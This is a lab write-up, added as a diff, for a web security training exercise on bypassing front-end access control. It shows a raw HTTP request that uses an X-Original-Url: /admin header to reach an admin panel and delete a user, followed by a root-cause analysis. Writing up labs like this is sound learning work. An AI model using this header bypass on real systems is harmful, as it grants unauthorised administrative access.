@@ -1,0 +1,43 @@
+Lab: URL-based access control can be circumvented
+
+Goal:-   This website has an unauthenticated admin panel at /admin, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the X-Original-URL header.
+To solve the lab, access the admin panel and delete the user carlos. 
+
+Observation:- #The application contains an admin panel accessible at /admin
+              #Direct access to this path is blocked by a front-end access control mechanism.
+              #The back-end framework supports the X-Original-URL header
+              #By sending a normal request and adding X-Original-URL: /admin, the backend processes the request as if it were targeting the admin endpoint.
+              #Access control is enforced only at the front-end layer, not on the backend.
+Steps to solve :- 
+        Step1:- Access the lab
+        Step2:- go to home and intercept the request on burpsuit
+        Step3:- GET / HTTP/2
+                Host: 0a30004903f2d4bf8070f3da004e003e.web-security-academy.net
+                X-Original-Url: /admin
+                Cookie: session=JfKDArDhyelENSK6YgyqoCDxF8kxI7Z6
+                User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+                Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+                Accept-Language: en-US,en;q=0.5
+                Accept-Encoding: gzip, deflate, br
+                Referer: https://0a30004903f2d4bf8070f3da004e003e.web-security-academy.net/login
+                Upgrade-Insecure-Requests: 1
+                Sec-Fetch-Dest: document
+                Sec-Fetch-Mode: navigate
+                Sec-Fetch-Site: same-origin
+                Sec-Fetch-User: ?1
+                Priority: u=0, i
+                Te: trailers
+
+
+        step4:- chk for it
+        Step5:- delete user name carlos
+        
+
+Root Cause:-  1) Access control was implemented only at the front-end (proxy/filter layer).
+          
+              2) The backend trusted the X-Original-URL header supplied by the client.
+          
+              3) The backend did not perform proper authorization checks for sensitive endpoints.
+
+Vulnerability Type:- URL-based access control bypass
+                          Broken Access Control
